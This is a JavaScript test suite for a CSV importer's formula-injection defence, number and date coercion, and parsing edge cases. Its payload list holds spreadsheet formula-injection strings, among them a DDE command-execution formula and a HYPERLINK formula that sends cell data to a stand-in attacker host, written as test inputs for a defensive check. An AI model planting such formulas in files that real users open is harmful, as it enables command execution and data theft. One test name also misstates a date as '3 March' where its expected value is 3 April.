// V3 Task 16 — CSV parsing, formula-injection defence, and coercion.
//
// The three things checked here are the three that would each silently
// corrupt somebody's business data:
//
//   1. FORMULA INJECTION. A cell that Excel executes when the user opens
//      a file WE exported. The attack path runs through our own export,
//      so both ends are tested.
//   2. NUMBER LOCALE. "1.234,56" and "1,234.56" are the same amount
//      written two ways, and reading one as the other is a factor of a
//      thousand on somebody's revenue.
//   3. DATE ORDER. "03/04/2025" is two different days. Guessing wrong
//      makes every time-based insight confidently and unfalsifiably
//      wrong, which is worse than having none.
//
// Run: node scripts/tests/csv-import.test.mjs
import { loadTs } from "./load-ts.mjs";

let pass = 0,
  fail = 0;
function check(name, actual, expected) {
  const a = JSON.stringify(actual),
    e = JSON.stringify(expected);
  if (a === e) {
    pass++;
    console.log(`  PASS  ${name}`);
  } else {
    fail++;
    console.log(`  FAIL  ${name}\n        expected ${e}\n        actual   ${a}`);
  }
}
function checkTrue(name, cond) {
  check(name, Boolean(cond), true);
}

const csv = await loadTs("src/lib/import/csv-parse.ts");
const coerce = await loadTs("src/lib/import/coerce.ts");
const exporter = await loadTs("src/lib/csv.ts");

console.log("== 1. formula injection is defused on the way IN ==");

// The classic payloads. Each one is executed by Excel/LibreOffice/Sheets
// the moment the file is opened.
const PAYLOADS = [
  "=cmd|'/c calc'!A1",
  '=HYPERLINK("http://evil.example/?"&A1,"Click me")',
  "@SUM(1+1)*cmd|'/c calc'!A0",
  "+1+1",
  "-1+1)*cmd|'/c calc'!A0",
  "\t=1+1",
  "\r=1+1",
  "   =1+1",
];
for (const payload of PAYLOADS) {
  const out = csv.neutraliseFormula(payload);
  checkTrue(`neutralised: ${JSON.stringify(payload)} -> ${JSON.stringify(out)}`, !/^[=+\-@]/.test(out));
  // The content survives — this is a defusing, not a deletion. A user
  // whose note genuinely starts with "=" should still be able to read it.
  checkTrue(`  ...and the text is preserved`, out.trim().length >= payload.trim().length - 1);
}

// The bug this guards: `-1500.00` is an expense, not an attack. An
// over-eager neutraliser mangles every negative number in a finance
// import, which is a far worse bug than the one it was fixing.
for (const number of ["-1500.00", "+42", "-0.5", "1.234,56", "-1,200.50", "-1'000"]) {
  check(`a plain number is untouched: ${number}`, csv.neutraliseFormula(number), number);
  check(`  ...and is not flagged as a formula`, csv.isFormulaCell(number), false);
}
check("a formula IS flagged", csv.isFormulaCell("=1+1"), true);
check("...even behind a tab", csv.isFormulaCell("\t=1+1"), true);

console.log("\n== 2. and on the way OUT, which is where it would execute ==");
// THE REGRESSION THIS PINS. Quoting is not a defence: Excel strips CSV
// quotes before evaluating the cell, so `"=cmd|..."` is still a formula.
// Before the fix, escapeCSVValue quoted and shipped the payload intact.
const exported = exporter.toCSV(["Note"], [["=cmd|'/c calc'!A1"]]);
const cell = exported.split("\r\n")[1];
checkTrue(`the exported cell does not start a formula: ${JSON.stringify(cell)}`, !/^"?[=+\-@]/.test(cell));
// A value typed by hand is exactly as executable as an imported one, so
// the export defuses everything, not only rows that came from a file.
const exportedNegative = exporter.toCSV(["Amount"], [[-1500.5]]);
check("a real number exports unchanged", exportedNegative.split("\r\n")[1], "-1500.5");
const exportedNegativeString = exporter.toCSV(["Amount"], [["-1500.50"]]);
check("a numeric string exports unchanged", exportedNegativeString.split("\r\n")[1], "-1500.50");
check("null exports as empty", exporter.toCSV(["A"], [[null]]).split("\r\n")[1], "");
// A semicolon now forces quoting too: an unquoted semicolon splits the
// cell for every European Excel, which reads ; as the delimiter.
checkTrue("a semicolon forces quoting", exporter.toCSV(["A"], [["a;b"]]).split("\r\n")[1].startsWith('"'));

console.log("\n== 3. the parser handles what real exports actually contain ==");
const simple = csv.parseCsv("Symbol,PnL\nAAPL,120\nTSLA,-40\n");
check("headers", simple.headers, ["Symbol", "PnL"]);
check("rows", simple.rows, [["AAPL", "120"], ["TSLA", "-40"]]);

const quoted = csv.parseCsv('Name,Note\n"Acme, Inc.","He said ""hi""\nand left"\n');
check("a comma inside quotes stays in the field", quoted.rows[0][0], "Acme, Inc.");
check("a doubled quote becomes one", quoted.rows[0][1], 'He said "hi"\nand left');

// Half of Europe exports with semicolons because their decimal separator
// is a comma. Guessing wrong makes every row a single useless column.
const semi = csv.parseCsv("Datum;Betrag\n01.03.2025;1.234,56\n");
check("a semicolon file is detected", semi.headers, ["Datum", "Betrag"]);
check("...and split correctly", semi.rows[0], ["01.03.2025", "1.234,56"]);
check("a tab file is detected", csv.parseCsv("A\tB\n1\t2\n").headers, ["A", "B"]);

// The BOM is invisible in every editor and would otherwise become part
// of the first header's name, so a mapping on "Date" never matches.
check("a BOM is stripped from the first header", csv.parseCsv("﻿Date,X\n1,2\n").headers[0], "Date");
check("CRLF is handled", csv.parseCsv("A,B\r\n1,2\r\n").rows, [["1", "2"]]);
check("a lone CR is handled", csv.parseCsv("A,B\r1,2\r").rows, [["1", "2"]]);
check("blank lines are skipped", csv.parseCsv("A,B\n\n1,2\n\n").rows, [["1", "2"]]);
// Ragged rows are an extremely common export bug. Refusing the file
// helps nobody; padding and truncating to the header width does.
check("a short row is padded", csv.parseCsv("A,B,C\n1\n").rows, [["1", "", ""]]);
check("a long row is truncated to the header width", csv.parseCsv("A,B\n1,2,3\n").rows, [["1", "2"]]);
check("an unnamed column still gets a name", csv.parseCsv("A,,C\n1,2,3\n").headers, ["A", "Column 2", "C"]);

// The parse and the neutralise have to compose: an earlier version
// trimmed AFTER neutralising, which stripped the defusing space straight
// back off and made the whole defence a no-op.
const poisoned = csv.parseCsv("Note\n=cmd|'/c calc'!A1\n");
checkTrue(
  `a payload in a parsed cell stays defused: ${JSON.stringify(poisoned.rows[0][0])}`,
  !/^[=+\-@]/.test(poisoned.rows[0][0])
);
checkTrue("...and so does one in a header", !/^[=+\-@]/.test(csv.parseCsv("=1+1,B\n1,2\n").headers[0]));

try {
  csv.parseCsv("   ");
  fail++;
  console.log("  FAIL  an empty file is refused");
} catch (err) {
  check("an empty file is refused", /empty/.test(err.message), true);
}

console.log("\n== 4. the row cap holds ==");
const many = "A\n" + Array.from({ length: csv.MAX_CSV_ROWS + 500 }, (_, i) => i).join("\n") + "\n";
const capped = csv.parseCsv(many);
check(`at most ${csv.MAX_CSV_ROWS} rows`, capped.rows.length, csv.MAX_CSV_ROWS);
// Truncation that is not REPORTED is the dangerous kind: the user would
// believe all 5,500 trades were analysed.
check("...and truncation is reported", capped.truncated, true);
check("a file under the cap is not marked truncated", simple.truncated, false);

console.log("\n== 5. the sample is a SPREAD, not the first N rows ==");
// Exports are usually sorted. The first twenty rows of a sorted file can
// be twenty identical values, from which no column type is inferrable.
const sorted = csv.parseCsv("V\n" + Array.from({ length: 120 }, (_, i) => (i < 100 ? "same" : `x${i}`)).join("\n"));
const sample = csv.sampleRows(sorted, 12);
check("the sample is the requested size", sample.length, 12);
checkTrue("...and reaches the varied tail", sample.some((r) => r[0].startsWith("x")));
check("a small file is sampled whole", csv.sampleRows(simple, 12).length, 2);

console.log("\n== 6. numbers, in the shapes spreadsheets write them ==");
const NUMBERS = [
  ["1234", 1234],
  ["1234.56", 1234.56],
  // Both separators present: the LAST one is the decimal point. This is
  // structural evidence, not a locale guess, and it is unambiguous.
  ["1.234,56", 1234.56],
  ["1,234.56", 1234.56],
  ["1.234.567,89", 1234567.89],
  ["1,234,567.89", 1234567.89],
  // Swiss grouping is always thousands.
  ["1'234.50", 1234.5],
  // One separator, two decimals: a decimal.
  ["12,75", 12.75],
  ["12.75", 12.75],
  // One separator, three digits after: ambiguous, resolved as thousands.
  // In a financial export "1.234" is a grouped thousand far more often
  // than it is a thousandth.
  ["1.234", 1234],
  ["1,234", 1234],
  // Currency and spacing.
  ["€ 1.234,56", 1234.56],
  ["$1,234.56", 1234.56],
  ["1 234,56", 1234.56],
  ["1234.56 EUR", 1234.56],
  // Accounting negatives.
  ["(1,200.00)", -1200],
  ["-1234.56", -1234.56],
  ["+42", 42],
  ["12%", 12],
];
for (const [input, expected] of NUMBERS) {
  const result = coerce.coerceNumber(input);
  check(`${JSON.stringify(input)} -> ${expected}`, result.ok ? result.value : result, expected);
}
for (const bad of ["", "   ", "abc", "N/A", "--"]) {
  check(`${JSON.stringify(bad)} is refused`, coerce.coerceNumber(bad).ok, false);
}

console.log("\n== 7. dates, including the one that cannot be guessed ==");
check("ISO", coerce.coerceDate("2025-03-04").ok && coerce.coerceDate("2025-03-04").value.slice(0, 10), "2025-03-04");
check("ISO with time", coerce.coerceDate("2025-03-04T09:30:00").value, "2025-03-04T09:30:00.000Z");
check("ISO with a space", coerce.coerceDate("2025-03-04 09:30").value, "2025-03-04T09:30:00.000Z");
// The whole point: the SAME string is two different days, and the order
// is what decides which.
check("03/04/2025 as d/m/y is 3 March", coerce.coerceDate("03/04/2025", "dmy").value.slice(0, 10), "2025-04-03");
check("03/04/2025 as m/d/y is 4 March", coerce.coerceDate("03/04/2025", "mdy").value.slice(0, 10), "2025-03-04");
check("a named month is unambiguous", coerce.coerceDate("12 Mar 2025").value.slice(0, 10), "2025-03-12");
check("...in the other word order too", coerce.coerceDate("Mar 12, 2025").value.slice(0, 10), "2025-03-12");
check("a four-digit lead is a year whatever the order", coerce.coerceDate("2025/03/04", "mdy").value.slice(0, 10), "2025-03-04");
check("a 12-hour time with pm", coerce.coerceDate("2025-03-04 09:30 pm").value, "2025-03-04T21:30:00.000Z");
check("midnight with am", coerce.coerceDate("2025-03-04 12:15 am").value, "2025-03-04T00:15:00.000Z");
check("two-digit year 24 is 2024", coerce.coerceDate("01/02/24", "dmy").value.slice(0, 4), "2024");
check("two-digit year 89 is 1989", coerce.coerceDate("01/02/89", "dmy").value.slice(0, 4), "1989");
// Date.UTC would happily roll 31 February into 3 March. Silently
// accepting a date that does not exist is how a corrupt column becomes
// an insight about March.
check("31 February is refused", coerce.coerceDate("31/02/2025", "dmy").ok, false);
check("month 13 is refused", coerce.coerceDate("2025-13-01").ok, false);
for (const bad of ["", "hello", "n/a"]) {
  check(`${JSON.stringify(bad)} is refused`, coerce.coerceDate(bad).ok, false);
}

console.log("\n== 8. the column decides the order, not a guess ==");
// As soon as ONE row has a first component above 12, the whole column is
// settled — and every row is then read the same way.
check(
  "a day above 12 anywhere settles d/m/y",
  coerce.detectDateOrder(["01/02/2025", "13/02/2025", "05/03/2025"]),
  { order: "dmy", ambiguous: false }
);
check(
  "a month position above 12 settles m/d/y",
  coerce.detectDateOrder(["01/13/2025", "02/05/2025"]),
  { order: "mdy", ambiguous: false }
);
check("an all-ISO column is ymd", coerce.detectDateOrder(["2025-01-02", "2025-03-04"]), {
  order: "ymd",
  ambiguous: false,
});
// THE HONEST CASE. Every date on or before the 12th: genuinely
// undecidable. Reporting `ambiguous` lets the UI ask instead of silently
// poisoning every time-based insight built on the column.
check("a genuinely undecidable column says so", coerce.detectDateOrder(["01/02/2025", "03/04/2025"]), {
  order: "dmy",
  ambiguous: true,
});
// Both positions above 12 cannot be one consistent order — the column is
// dirty, and pretending otherwise would import wrong dates.
check("a self-contradicting column says so", coerce.detectDateOrder(["13/02/2025", "01/13/2025"]), {
  order: "dmy",
  ambiguous: true,
});
check("an empty column says so", coerce.detectDateOrder(["", "  "]), { order: "dmy", ambiguous: true });

console.log("\n== 9. enums map synonyms, and refuse the rest ==");
const dir = coerce.ENUM_SYNONYMS.direction;
check("buy -> long", coerce.coerceEnum("Buy", ["long", "short"], dir), "long");
check("S -> short", coerce.coerceEnum("S", ["long", "short"], dir), "short");
check("long -> long", coerce.coerceEnum("LONG", ["long", "short"], dir), "long");
// An unrecognised value becomes NULL rather than being forced into the
// first option — a trade wrongly labelled "long" is worse than one with
// no direction at all.
check("an unknown value is null, not the first option", coerce.coerceEnum("wibble", ["long", "short"], dir), null);
check("empty is null", coerce.coerceEnum("", ["long", "short"], dir), null);
const type = coerce.ENUM_SYNONYMS.type;
check("credit -> income", coerce.coerceEnum("Credit", ["income", "expense"], type), "income");
check("debit -> expense", coerce.coerceEnum("DEBIT", ["income", "expense"], type), "expense");

console.log(`\n${fail === 0 ? "ALL PASS" : "FAILURES"}: ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
